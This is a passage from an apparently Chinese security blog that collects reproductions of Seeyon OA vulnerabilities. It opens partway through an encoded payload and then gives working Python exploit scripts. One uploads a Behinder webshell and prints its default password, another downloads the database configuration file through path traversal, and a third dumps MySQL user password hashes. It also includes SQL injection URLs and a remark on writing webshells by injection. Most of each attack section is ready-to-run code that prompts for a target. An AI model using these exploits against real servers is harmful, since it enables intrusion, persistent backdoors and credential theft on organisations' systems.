class="variable">%B9X</span><span class="variable">%C2</span><span class="variable">%A4</span><span class="variable">%C2</span><span class="variable">%B2</span><span class="variable">%28</span><span class="variable">%60</span>XMn<span class="variable">%C3</span><span class="variable">%90</span><span class="variable">%18</span><span class="variable">%C3</span><span class="variable">%A6</span><span class="variable">%C2</span><span class="variable">%AE</span><span class="variable">%C2</span><span class="variable">%81</span>o<span class="variable">%C3</span><span class="variable">%B4m</span><span class="variable">%C2</span><span class="variable">%BA</span><span class="variable">%C3</span><span class="variable">%97</span><span class="variable">%C2</span><span class="variable">%95</span><span class="variable">%C2</span><span class="variable">%85</span><span class="variable">%12</span><span class="variable">%C2</span><span class="variable">%AAs</span><span class="variable">%C2</span><span class="variable">%9</span>A<span class="variable">%C3</span><span class="variable">%97</span><span class="variable">%C3</span><span class="variable">%A2n</span><span class="variable">%C2</span><span class="variable">%977</span><span class="variable">%C3</span><span class="variable">%BD</span><span class="variable">%C3</span><span class="variable">%81</span><span class="variable">%C2</span><span class="variable">%A9x</span><span class="variable">%1</span>F<span class="variable">%C3</span><span class="variable">%A9</span><span class="variable">%C3</span><span class="variable">%84</span><span class="variable">%C2</span><span class="variable">%A6</span><span class="variable">%C2</span><span class="variable">%BD</span>*<span class="variable">%2</span>FW<span class="variable">%18</span><span class="variable">%C2</span><span class="variable">%98</span><span class="variable">%3</span>A<span class="variable">%06</span><span class="variable">%C3</span><span class="variable">%BC</span><span class="variable">%3</span>E<span class="variable">%C2</span><span class="variable">%B79</span><span class="variable">%C2</span><span class="variable">%9</span>D<span class="variable">%3</span>D<span class="variable">%12</span><span class="variable">%C3</span><span class="variable">%BD</span><span class="variable">%C3</span><span class="variable">%AD</span><span class="variable">%C2</span><span class="variable">%8</span>F<span class="variable">%1</span>C<span class="variable">%C3</span><span class="variable">%944</span><span class="variable">%C2</span><span class="variable">%9</span>D<span class="variable">%5</span>E<span class="variable">%C2</span><span class="variable">%97</span><span class="variable">%1</span>Cc<span class="variable">%C3</span><span class="variable">%AAgBc</span><span class="variable">%C2</span><span class="variable">%A0</span><span class="variable">%C3</span><span class="variable">%B1</span><span class="variable">%C3</span><span class="variable">%83</span><span class="variable">%C2</span><span class="variable">%95</span><span class="variable">%1</span>B<span class="variable">%29</span><span class="variable">%C2</span><span class="variable">%ACe</span><span class="variable">%08</span><span class="variable">%21</span><span class="variable">%C2</span><span class="variable">%8</span>D<span class="variable">%C2</span><span class="variable">%8</span>F<span class="variable">%C3</span><span class="variable">%BA</span><span class="variable">%C2</span><span class="variable">%A1</span><span class="variable">%C2</span><span class="variable">%97</span><span class="variable">%C3</span><span class="variable">%90</span>X<span class="variable">%C2</span><span class="variable">%A4</span><span class="variable">%C2</span><span class="variable">%A0</span><span class="variable">%0</span>A<span class="variable">%C2</span><span class="variable">%9</span>A<span class="variable">%C2</span><span class="variable">%9</span>E<span class="variable">%C3</span><span class="variable">%9</span>Es<span class="variable">%C3</span><span class="variable">%A3</span><span class="variable">%1</span>C<span class="variable">%C2</span><span class="variable">%8</span>A<span class="variable">%C3</span><span class="variable">%BA</span><span class="variable">%10</span><span class="variable">%C3</span><span class="variable">%92</span><span class="variable">%C3</span><span class="variable">%9</span>A<span class="variable">%C3</span><span class="variable">%AE</span><span class="variable">%C2</span><span class="variable">%A6</span><span class="variable">%C3</span><span class="variable">%A3</span><span class="variable">%C2</span><span class="variable">%A6</span><span class="variable">%27</span><span class="variable">%01</span><span class="variable">%C2</span><span class="variable">%A7T</span><span class="variable">%C2</span><span class="variable">%8</span>E<span class="number">9</span>a<span class="variable">%5</span>DQgw<span class="variable">%C3</span><span class="variable">%A1</span><span class="variable">%C2</span><span class="variable">%B5h</span><span class="variable">%C3</span><span class="variable">%AB</span><span class="variable">%C2</span><span class="variable">%BA</span>*<span class="variable">%5</span>C<span class="variable">%7</span>E<span class="variable">%C3</span><span class="variable">%BF</span><span class="variable">%C3</span><span class="variable">%B8</span><span class="variable">%3</span>E<span class="variable">%C3</span><span class="variable">%ADL</span><span class="variable">%C2</span><span class="variable">%9</span>AG<span class="variable">%7</span>D<span class="variable">%C2</span><span class="variable">%82</span>R<span class="variable">%C3</span><span class="variable">%90</span><span class="variable">%C2</span><span class="variable">%9</span>F<span class="variable">%C2</span><span class="variable">%BCh</span><span class="variable">%C3</span><span class="variable">%B3o</span><span class="variable">%C3</span><span class="variable">%83</span><span class="variable">%C2</span><span class="variable">%99</span><span class="variable">%07</span>bH<span class="variable">%07</span><span class="variable">%1</span>E<span class="variable">%C3</span><span class="variable">%9</span>E<span class="variable">%C3</span><span class="variable">%AFv</span><span class="variable">%C3</span><span class="variable">%96</span><span class="variable">%3</span>FW<span class="variable">%C3</span><span class="variable">%AA</span><span class="variable">%C3</span><span class="variable">%BDw</span><span class="variable">%C2</span><span class="variable">%AA</span><span class="variable">%5</span>B<span class="variable">%C2</span><span class="variable">%B3</span><span class="variable">%3</span>B<span class="variable">%C3</span><span class="variable">%93</span><span class="variable">%C3</span><span class="variable">%9</span>A<span class="variable">%C2</span><span class="variable">%B6L</span><span class="variable">%C3</span><span class="variable">%AF</span><span class="variable">%0</span>E<span class="variable">%C3</span><span class="variable">%98</span>o<span class="variable">%C3</span><span class="variable">%AFI</span><span class="variable">%7</span>E<span class="variable">%3</span>AQ<span class="variable">%C2</span><span class="variable">%80</span>f<span class="variable">%09</span><span class="variable">%3</span>C<span class="variable">%7</span>C<span class="variable">%C3</span><span class="variable">%A9</span><span class="variable">%1</span>C<span class="variable">%0</span>F<span class="variable">%C2</span><span class="variable">%8</span>B<span class="variable">%C2</span><span class="variable">%AF</span><span class="variable">%C3</span><span class="variable">%8</span>F<span class="variable">%1</span>F<span class="variable">%C2</span><span class="variable">%97</span><span class="variable">%C3</span><span class="variable">%84</span><span class="variable">%C3</span><span class="variable">%87</span><span class="variable">%7</span>D<span class="variable">%C3</span><span class="variable">%93</span>o<span class="variable">%18</span><span class="variable">%1</span>C<span class="variable">%C3</span><span class="variable">%B5</span><span class="variable">%3</span>E<span class="variable">%C2</span><span class="variable">%82</span><span class="variable">%C3</span><span class="variable">%BF</span><span class="variable">%C2</span><span class="variable">%9</span>F.<span class="variable">%C3</span><span class="variable">%80</span>q<span class="variable">%C3</span><span class="variable">%AAQ</span><span class="variable">%C3</span><span class="variable">%87</span><span class="variable">%7</span>E<span class="variable">%7</span>C<span class="variable">%C2</span><span class="variable">%AF</span><span class="variable">%C3</span><span class="variable">%B7</span><span class="variable">%21</span><span class="variable">%25</span><span class="variable">%C2</span><span class="variable">%A0wb</span><span class="variable">%C3</span><span class="variable">%92</span><span class="variable">%C3</span><span class="variable">%8</span>C<span class="variable">%C3</span><span class="variable">%89</span><span class="variable">%10</span><span class="variable">%60</span><span class="variable">%C3</span><span class="variable">%8</span>A<span class="variable">%C2</span><span class="variable">%B2</span><span class="variable">%C3</span><span class="variable">%AC</span><span class="variable">%3</span>D<span class="variable">%C2</span><span class="variable">%BCv</span><span class="variable">%7</span>F<span class="variable">%C3</span><span class="variable">%90</span><span class="variable">%25</span>I<span class="variable">%17</span><span class="variable">%C3</span><span class="variable">%A5k</span><span class="variable">%7</span>Dg<span class="variable">%C2</span><span class="variable">%97</span><span class="variable">%C3</span><span class="variable">%9</span>C<span class="variable">%C3</span><span class="variable">%AB</span><span class="variable">%C3</span><span class="variable">%BE</span><span class="variable">%C3</span><span class="variable">%BD</span><span class="variable">%2</span>FheA<span class="variable">%C3</span><span class="variable">%A4_</span><span class="variable">%05</span><span class="variable">%00</span><span class="variable">%00</span></span></span><br></pre></td></tr></table></figure>

<p>成功会返回</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">{</span></span><br><span class="line">    <span class="attr">"message"</span><span class="punctuation">:</span><span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"details"</span><span class="punctuation">:</span><span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"code"</span><span class="punctuation">:</span><span class="string">"0436821967"</span></span><br><span class="line"><span class="punctuation">}</span></span><br></pre></td></tr></table></figure>

<p>失败会返回</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">{</span></span><br><span class="line">  <span class="attr">"message"</span><span class="punctuation">:</span> <span class="string">"被迫下线，原因：与服务器失去连接"</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">"code"</span><span class="punctuation">:</span> <span class="string">"-1"</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">"details"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span></span><br><span class="line"><span class="punctuation">}</span></span><br></pre></td></tr></table></figure></li>
<li><p>漏洞利用POC</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> requests.packages.urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">title</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'+------------------------------------------'</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'+  \033[36m使用格式:  python3 poc.py                                            \033[0m'</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'+  \033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             \033[0m'</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'+------------------------------------------'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">POC_1</span>(<span class="params">target_url</span>):</span><br><span class="line">    vuln_url_2 = target_url + <span class="string">"/seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&amp;managerName=formulaManager&amp;requestCompress=gzip"</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'\033[36m[o] 正在请求: {}'</span>.<span class="built_in">format</span>(vuln_url_2))</span><br><span class="line">    headers = {</span><br><span class="line">        <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"</span>,</span><br><span class="line">        <span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span>,</span><br><span class="line">    }</span><br><span class="line">    data = <span class="string">"managerMethod=validate&amp;arguments=%1F%C2%8B%08%00%00%00%00%00%00%00uTK%C2%93%C2%A2H%10%3E%C3%AF%C3%BE%0A%C3%82%C2%8Bv%C3%B4%C2%8C%C2%8D+c%C2%BB%13%7Bh_%C2%88%28*%28%C2%AF%C2%8D%3D%40%15Ba%15%C2%B0%C3%B2%10%C3%AC%C2%98%C3%BF%C2%BE%05%C3%98%C3%93%3D%C2%B1%C2%BDu%C2%A9%C3%8C%C2%AC%C3%8C%C2%AF%C3%B2%C3%BD%C3%97k%C3%B7%14_H%C2%8E%C2%9DC%C2%95x%C3%9D%3F%C2%98%C3%81%17%C3%A6M%C2%A28%C2%A4%C2%96t3%2F%C3%8D%C2%BA%C3%AF%C3%A2y%C2%99%5C%C2%BC4EqT%3Fj%C3%99%05E%3E%C2%938Y%C3%80%C3%BC%C3%89t%C3%BA%C3%BD%C2%A7%C2%AB%C3%A7%3AI%C2%92%3E%C2%A5%C2%9EW%C3%85%C3%91S%C3%A7%C3%BB%C3%AFL%7B%7E%0B%C2%9D%C3%82%C3%A9%C2%A3%C2%B8%C2%BF%C2%A3%26%C2%99qA%C2%99wa%C2%92w%C2%9A%C2%A3%00%C2%91we%3EQ%C3%AB%C3%95%C3%B8%C2%8F%1D%C2%AD%C2%81%3C%26%C3%90%C3%89%C2%BCA%3FL%C2%93%C2%B2%C3%B3%C3%B0%13%C2%9E%C2%B9%C2%BB%C2%92%06%1E%C3%86%C2%B5%2F%3B1%C2%B9%C2%81YR%C2%B9%C3%9C%C2%98%C2%95%C2%96A%C3%A6%C2%8A%C3%82mKj%19%C2%8B%C2%9C%C2%A5%C3%8A%C2%82Y%5C%C2%AC%C2%B9%24%C2%80d%C2%9E%03%5E%C3%8F%C3%97D%29%5Cm%2C%1F%07%2F%C3%85Q%5CD%C2%B6%26%C3%B9%C2%90%C3%A8%15%C3%A0p%C3%A1%C2%86%2C%C3%9Ah%C3%83J%0A%C2%87%C3%8FN%C2%A4%5C%C2%B7DM%00%C3%91C%28b%C3%8E%C3%96%C2%84%C2%ABe%40%2C%C2%898%03%C3%A2%C2%B8%C2%825%3EYp%C2%96%26%0C%C3%A8%7B%C2%BAFq%C3%9A%C3%B0%C2%A6%C2%9F%5B%C3%BCJ%00K%C2%B5%C3%B8TFqmc%C2%93%C3%8BH*va%C3%B9%0F%C3%A0_%C2%BE%C3%99%C2%A2%1E%C2%BA%C3%A2%C2%A2%C2%B2L5q%C2%B9%C3%A1%C2%A3%24*%C2%A9e*7iq%C3%B4m3%60mC8%C2%83j2%C2%A3%3A7%C3%80%C2%96%C2%85e%C2%A8%18D%C2%99.%C3%8F%5B%C2%BD%C2%838%0E%28F%25%C2%89%C2%9B%C3%84%C3%A3%C2%95%01%C2%A0%C2%B4L%C3%A9-%3F%C2%B8Bc%C2%95%3A%C3%86%C3%86%C3%9Fse%00%C3%B8%C2%8DoW%01%C3%B2L%15K%C2%8B%0CZ%08%C2%8Fh%7C%2C4W%C2%B9%C2%B4l%C3%AD%C3%96D%C3%856%C3%81%C2%B9%7Dl%C2%B1eQJ7%C3%93%12%C2%ADI%C2%89%5D%02Ygz%1E%C2%9DL%C3%B6%C2%99%C3%A6%C2%B4%C3%8E%C3%BB%C3%996j%C2%BDU%40s%40%C3%B3w%C3%8F%5B%C2%A4%C2%84%C2%80%C3%A0%2B%14K%0Cg%C3%82%01.W%C2%89K%C2%80%C3%AF%C3%9CXd%1F%C3%B6%03%C3%BB%C2%B0%C2%A9%C2%B6%C2%86%C2%8D%C2%ADP%3Fo%0F%C3%92%C3%80B%C3%92%08p%C3%BA%C2%AD%C2%A9%01%12%C2%AE%C3%90T%0D%C3%8B%28%07%C2%B6%C3%A6%23%C2%A8I%C2%A9S%C2%9DG%7B%0E_%C2%9D6%C3%86%C3%B1%1B%C2%BD%26%10%C3%839%C2%A6uU%03%C2%97%28X%C2%9E%C2%AE%26%C2%AA%C2%BEA%C3%B2%21%0B%C3%974%06%C3%87%C3%9C%C3%87%1BT%C3%A6%C2%B6%09%C3%BC%23%C2%A7%C2%87u%C2%AC%1A%C2%A7%0BG%7E%C2%82%C2%AD%C3%8A%C2%8F%3F%C3%BC%19%C3%99%C2%BF%C3%BE%C2%99%C3%88%C2%95%C2%84d%C2%AD%C2%91O%C3%AB%7C%C2%81%C3%8AO%C3%96o%C3%B8%C3%9Ay%C3%A4%12%C2%9D%C2%A7%C3%B5%C2%89%C2%A1%18%24%C2%A0j%C3%B4%C3%9A%C3%BA%C3%94z%C2%8D_%C2%BF%C3%96F%C2%9E%C2%9E%C2%A9%1C%C3%84V%25%C2%9C%5D%C3%96%C2%A6%C3%B9X%C2%A4%C2%B2%28%60XMn%C3%90%18%C3%A6%C2%AE%C2%81o%C3%B4m%C2%BA%C3%97%C2%95%C2%85%12%C2%AAs%C2%9A%C3%97%C3%A2n%C2%977%C3%BD%C3%81%C2%A9x%1F%C3%A9%C3%84%C2%A6%C2%BD*%2FW%18%C2%98%3A%06%C3%BC%3E%C2%B79%C2%9D%3D%12%C3%BD%C3%AD%C2%8F%1C%C3%944%C2%9D%5E%C2%97%1Cc%C3%AAgBc%C2%A0%C3%B1%C3%83%C2%95%1B%29%C2%ACe%08%21%C2%8D%C2%8F%C3%BA%C2%A1%C2%97%C3%90X%C2%A4%C2%A0%0A%C2%9A%C2%9E%C3%9Es%C3%A3%1C%C2%8A%C3%BA%10%C3%92%C3%9A%C3%AE%C2%A6%C3%A3%C2%A6%27%01%C2%A7T%C2%8E9a%5DQgw%C3%A1%C2%B5h%C3%AB%C2%BA*%5C%7E%C3%BF%C3%B8%3E%C3%ADL%C2%9AG%7D%C2%82R%C3%90%C2%9F%C2%BCh%C3%B3o%C3%83%C2%99%07bH%07%1E%C3%9E%C3%AFv%C3%96%3FW%C3%AA%C3%BDw%C2%AA%5B%C2%B3%3B%C3%93%C3%9A%C2%B6L%C3%AF%0E%C3%98o%C3%AFI%7E%3AQ%C2%80f%09%3C%7C%C3%A9%1C%0F%C2%8B%C2%AF%C3%8F%1F%C2%97%C3%84%C3%87%7D%C3%93o%18%1C%C3%B5%3E%C2%82%C3%BF%C2%9F.%C3%80q%C3%AAQ%C3%87%7E%7C%C2%AF%C3%B7%21%25%C2%A0wb%C3%92%C3%8C%C3%89%10%60%C3%8A%C2%B2%C3%AC%3D%C2%BCv%7F%C3%90%25I%17%C3%A5k%7Dg%C2%97%C3%9C%C3%AB%C3%BE%C3%BD%2FheA%C3%A4_%05%00%00"</span></span><br><span class="line">    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line">    response = requests.post(url=vuln_url_2, headers=headers, data=data, verify=<span class="literal">False</span>)</span><br><span class="line">    test_webshell(target_url)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_webshell</span>(<span class="params">target_url</span>):</span><br><span class="line">    webshell_url = target_url + <span class="string">"/seeyon/apps_res/addressbook/images/config.jspx"</span></span><br><span class="line">    headers = {</span><br><span class="line">        <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"</span>,</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line">        response = requests.get(url=webshell_url, timeout=<span class="number">10</span>, verify=<span class="literal">False</span>, headers=headers)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"\033[32m[o] 正在请求 : {}/seeyon/apps_res/addressbook/images/config.jspx\033[0m"</span>.<span class="built_in">format</span>(target_url))</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"\033[32m[o] 目标 {} 成功上传 webshell : {}/seeyon/apps_res/addressbook/images/config.jspx\033[0m"</span>.<span class="built_in">format</span>(target_url,target_url))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"\033[32m[o] webshell地址：{}/seeyon/apps_res/addressbook/images/config.jspx \033[0m"</span>.<span class="built_in">format</span>(target_url))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"\033[32m[o] 冰蝎3默认马 pass ：rebeyond \033[0m"</span>.<span class="built_in">format</span>(target_url))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"\033[31m[x] 目标漏洞无法利用，写入失败 \033[0m"</span>)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"\033[31m[x] 目标漏洞无法利用，写入失败 {} \033[0m"</span>.<span class="built_in">format</span>(e))</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    title()</span><br><span class="line">    target_url = <span class="built_in">str</span>(<span class="built_in">input</span>(<span class="string">"\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m"</span>))</span><br><span class="line">    POC_1(target_url)</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="【CNVD-2020-62422】致远OA-webmail-do任意文件下载漏洞"><a href="#【CNVD-2020-62422】致远OA-webmail-do任意文件下载漏洞" class="headerlink" title="【CNVD-2020-62422】致远OA webmail.do任意文件下载漏洞"></a>【CNVD-2020-62422】致远OA webmail.do任意文件下载漏洞</h2><h3 id="漏洞描述-2"><a href="#漏洞描述-2" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>致远OA存在任意文件下载漏洞，攻击者可利用该漏洞下载任意文件，获取敏感信息。</p>
<h3 id="影响版本-2"><a href="#影响版本-2" class="headerlink" title="影响版本"></a>影响版本</h3><p>致远OA A6-V5</p>
<p>致远OA A8-V5</p>
<p>致远OA G6</p>
<h3 id="复现过程-2"><a href="#复现过程-2" class="headerlink" title="复现过程"></a>复现过程</h3><ol>
<li><p>访问URL<code>/seeyon/webmail.do?method=doDownloadAtt&amp;filename=test.txt&amp;filePath=../conf/datasourceCtp.properties</code>，如果下载 <strong>datasourceCtp.properties</strong> 配置文件，存在漏洞。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912225638.png"></p>
</li>
<li><p>更改参数 filePath 可下载其他文件</p>
</li>
<li><p>漏洞利用POC</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> requests.packages.urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">title</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'+------------------------------------------'</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'+  \033[34mVersion: 致远OA多个版本                                              \033[0m'</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'+  \033[36m使用格式:  python3 poc.py                                           \033[0m'</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'+  \033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             \033[0m'</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'+------------------------------------------'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">POC_1</span>(<span class="params">target_url</span>):</span><br><span class="line">    vuln_url = target_url + <span class="string">"/seeyon/webmail.do?method=doDownloadAtt&amp;filename=test.txt&amp;filePath=../conf/datasourceCtp.properties"</span></span><br><span class="line">    headers = {</span><br><span class="line">        <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"</span>,</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line">        response = requests.get(url=vuln_url, headers=headers, verify=<span class="literal">False</span>, timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"workflow"</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"\033[32m[o] 目标{}存在漏洞 \033[0m"</span>.<span class="built_in">format</span>(target_url))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"\033[32m[o] 响应为:\n{} \033[0m"</span>.<span class="built_in">format</span>(response.text))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"\033[31m[x] 文件请求失败 \033[0m"</span>)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"\033[31m[x] 请求失败 \033[0m"</span>, e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    title()</span><br><span class="line">    target_url = <span class="built_in">str</span>(<span class="built_in">input</span>(<span class="string">"\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m"</span>))</span><br><span class="line">    POC_1(target_url)</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="致远OA-A6-setextno-jsp-SQL注入漏洞"><a href="#致远OA-A6-setextno-jsp-SQL注入漏洞" class="headerlink" title="致远OA A6 setextno.jsp SQL注入漏洞"></a>致远OA A6 setextno.jsp SQL注入漏洞</h2><h3 id="漏洞描述-3"><a href="#漏洞描述-3" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>致远OA A6 setextno.jsp 存在sql注入漏洞，并可以通过注入写入webshell文件控制服务器</p>
<h3 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><p>致远OA A6</p>
<h3 id="复现流程"><a href="#复现流程" class="headerlink" title="复现流程"></a>复现流程</h3><ol>
<li><p>漏洞URL为<code>/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912225757.png"></p>
</li>
<li><p>访问如下URL测试SQL注入<code>/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(99999) union all select 1,2,(md5(1)),4#</code></p>
<p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912225903.png"></p>
<p>分机号显示4，存在SQL注入</p>
</li>
<li><p>查看版本和用户显示如下</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912225925.png"></p>
</li>
<li><p>接着可以利用into file写入webshell，由于使用的是真实系统，不进行写Webshell。</p>
</li>
</ol>
<h2 id="致远OA-A6-createMysql-jsp-数据库敏感信息泄露"><a href="#致远OA-A6-createMysql-jsp-数据库敏感信息泄露" class="headerlink" title="致远OA A6 createMysql.jsp 数据库敏感信息泄露"></a>致远OA A6 createMysql.jsp 数据库敏感信息泄露</h2><h3 id="漏洞描述-4"><a href="#漏洞描述-4" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>致远OA A6 存在数据库敏感信息泄露，攻击者可以通过访问特定的URL获取数据库账户以及密码MD5。</p>
<h3 id="漏洞影响-1"><a href="#漏洞影响-1" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><p>致远OA A6</p>
<h3 id="复现流程-1"><a href="#复现流程-1" class="headerlink" title="复现流程"></a>复现流程</h3><ol>
<li><p>访问如下URL，可以读取数据库账户以及密码MD5，相当于执行了SQL语句<code>select * from mysql.user; </code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912230101.png"></p>
</li>
<li><p>漏洞利用POC</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> requests.packages.urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">title</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'+------------------------------------------'</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'+  \033[34mVersion: 致远OA A6                                            \033[0m'</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'+  \033[36m使用格式:  python3 poc.py                                            \033[0m'</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'+  \033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             \033[0m'</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'+------------------------------------------'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">POC_1</span>(<span class="params">target_url</span>):</span><br><span class="line">    vuln_url = target_url + <span class="string">"/yyoa/createMysql.jsp"</span></span><br><span class="line">    headers = {</span><br><span class="line">        <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"</span>,</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line">        response = requests.post(url=vuln_url, headers=headers, verify=<span class="literal">False</span>, timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"\033[36m[o] 正在请求 {}/yyoa/createMysql.jsp..... \033[0m"</span>.<span class="built_in">format</span>(target_url))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'root'</span> <span class="keyword">in</span> response.text <span class="keyword">and</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"\033[36m[o] 响应为:{}\n \033[0m"</span>.<span class="built_in">format</span>(response.text))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"\033[31m[x] 请求失败\033[0m"</span>.<span class="built_in">format</span>(target_url))</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"\033[31m[x] 请求失败 \033[0m"</span>, e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    title()</span><br><span class="line">    target_url = <span class="built_in">str</span>(<span class="built_in">input</span>(<span class="string">"\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m"</span>))</span><br><span class="line">    POC_1(target_url)</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912230143.png"></p>
</li>
</ol>
